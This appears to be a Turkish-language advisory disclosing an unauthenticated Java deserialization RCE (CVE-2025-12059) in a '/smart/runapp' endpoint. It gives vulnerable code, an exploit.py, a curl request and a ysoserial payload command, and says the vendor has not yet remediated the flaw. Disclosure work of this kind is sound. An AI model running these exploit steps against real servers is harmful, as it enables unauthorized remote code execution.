---
title: "CVE-2025-12059"
description: "CWE-502"
---

**Date:** 2025-10-04\
**Reported to vendor:** reported, vendor not yet remediated\
**Severity:** Critical (CVSS v3.1 = **9.8**) (Full system compromise risk)\
AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H\
**CWE:** CWE-502

Uygulamadaki `/logo/smart/runapp` uç noktası, kimlik doğrulaması olmadan gelen istek gövdesini \*\*Java \*\*`ObjectInputStream.readObject()` ile işliyor. Bu sayede **serileştirilmiş (serialized) kötü niyetli nesne** gönderildiğinde, bilinen **gadget zincirleri** (`CommonsCollections2` + `TemplatesImpl`) aracılığıyla **RCE** mümkün oluyor. İstismar, **GET/POST** yanında uygulama hatası nedeniyle **HEAD** isteği ile de tetiklenebiliyor.

## Olay Akışı

1. `http://xx.xxx.xx.xxx:8080/logo/smart/runapp?...` uç noktası tespit edildi; yanıt olarak JNLP döndürdüğü ve **kimlik doğrulaması istemediği** görüldü.
2. JNLP içinde ana bileşenler` Startupv3.29.6.4` gibi JAR’lara işaret ediyor.
3. `Startupv3.29.6.4 `JAR analizi sırasında `com.lbs.start.SocketToken` sınıfında `new ServerSocket(port)` ve `new ObjectInputStream(...).readObject()` çağrıları belirlendi; gelen mesajlar filtre/allow-list olmadan işleniyor.
4. `ysoserial` ile hazırlanan `payload.ser` CommonsCollections2 + TemplatesImpl + `Runtime.exec` **HEAD** isteğinin **gövdesi** olarak `/smart/runapp`’a gönderildi ve **sunucuda dosya oluşturma** ile RCE doğrulandı.

## Teknik kanıt

runapp.jnlp içeriğinden doğruca startup.jar dosyasına yönlendirme var, ilgili linke gidip jar dosyasını sistemimde decode edip analiz ettim.\
\
JAR içindeki `com.lbs.start.SocketToken` / `new ServerSocket(port)` + `ObjectInputStream.readObject()` çağrıları gelen socket üzerinde doğrudan `readObject()` çağırıyor.

```java
in = new ObjectInputStream(s.getInputStream());
message = (String) in.readObject(); // doğrudan deserializasyon
// ...
message = (String) in.readObject(); // tekrarlanarak kullanılmakta
if (message != null && message.equals("LBS_Hello")) {

// initlisten içinde

connection = ms_Instance.accept();
in = new ObjectInputStream(connection.getInputStream());
processor.processToken(message);
```

- Ayrıca `initListen(...)` içinde `ms_Instance.accept()` ile kabul edilen bağlantılarda yine `new ObjectInputStream(connection.getInputStream())` çağrısı ve `processor.processToken(message)` ile gelen nesnenin uygulama mantığına verildiği görülüyor.
- Gelen veriye **hiçbir güvenlik filtresi uygulanmadan** `readObject()` çağrısı yapılmakta.\
  \
  [exploit.py](http://exploit.py) // HEAD ile tetikleme

```python
import requests

url = "http://xx.xxx.xxx.xx:8080/xxxxxx/xxxxx/runapp?mem=2048&lang=TRTR&access_token=test123&tenantId=1&firmNr=001" ## Veriler Rastgeledir.
payload_file = "payload.ser" ## bizim dosya

with open(payload_file, "rb") as f:
    payload = f.read()

response = requests.head(url, data=payload)

print(f"[+] Response: {response.status_code}")
print(response.headers)

if response.status_code == 200:
    print("[+] HEAD request successfully sent.")
else:
    print(f"[!] Error: {response.status_code}");
```

Veya

```bash
curl -v --http1.1 -X HEAD \
  -H 'Content-Type: application/x-java-serialized-object' \
  --data-binary @payload.ser \
  'http://host:8080/xxxx/smart/runapp'
```

```bash
java --add-opens java.base/sun.reflect.annotation=ALL-UNNAMED \
     --add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
     --add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
     --add-opens java.base/java.util=ALL-UNNAMED \
     -jar ysoserial-all.jar CommonsCollections2 "touch /tmp/pwned" > payload.ser
```

<img
  src="/images/Ekrangörüntüsü2025-11-01031514.png"
  alt="Ekrangörüntüsü2025 11 01031514 Pn"
  title="Ekrangörüntüsü2025 11 01031514 Pn"
  style={{ width:"75%" }}
/>

## Kanıtın Gözlemi

Pyhon komutu ile HEAD isteği başarı ile gönderildi.

![Ekrangörüntüsü2025 11 03213652 Pn](/images/Ekrangörüntüsü2025-11-03213652.png)

HEAD attığımızla birlikte python kodunda girdiğimiz link işlenmiş, oraya girdiğimiz şey her ne olursa olsun bir önemi yok, içeride bir deserialization işlem yapılma ihtimali eğer doğru yapılandırma yoksa apache tomcat ve Java WEB applerde çok yüksek ki sunucu PUT veya DELETE gibi HTTP methodlarına izin verdiği için bu işleme çok müsait bir ortam var. HEAD İsteği ile RCE standart gereği beklenmez, ancak yanlış/gevşek implementasyonlar nedeniyle mümkün oldu.

Sonuç olarak, `python.py`'yi çalıştırdığım zaman sunucuda tmp/pwned klasörü oluştuğunu görebiliriz.

<img
  src="/images/photo_5785129057623149694_y.jpg"
  alt="Photo 5785129057623149694 Y Jp"
  title="Photo 5785129057623149694 Y Jp"
  style={{ width:"91%" }}
/>

Şu anda ilgili firma zafiyeti tamamen gidermediği için, güvenlik riski devam ettiği sürece ayrıntılı poc veya exploit kodu yayımlamıyorum.

## Deserialization Kaynaklı RCE Nasıl Oluşur.

![Ekrangörüntüsü2025 11 01220812 Pn](/images/Ekrangörüntüsü2025-11-01220812.png)

Obje sınıfı ilk anlattığım gibi `readObject() / ObjectInputStream`  gibi objeler olabilir, obje oldukça masumane bir şekilde ilgili sisteme veri getir götür işlemlerini yaparken, burada zafiyet olduğunu tespit eden Kötü Niyetli Saldırgan kişisi `A` olayında olduğu gibi, olan veriyi Serileştirerek içeriye sokar.\
`B `olayında ise eğer kötü niyetli saldırgan serileştirilmiş veriyi gönderebilirse deserialization dediğimiz olay gerçekleşir ve sistem içeride bu veriyi seri durumdan çıkarır ve sistemi içeriye sokar. `C` olayında ise artık saldırganın içeride komut çalıştırmasının önünde bir engel kalmaz.

<Danger>
  **Bu çalışma yalnızca güvenlik araştırması ve farkındalık amacıyla yapılmıştır. İlgili kurum bilgilendirilmiş, güvenlik açığı kapatılana kadar exploit detayları paylaşılmamıştır.**
</Danger>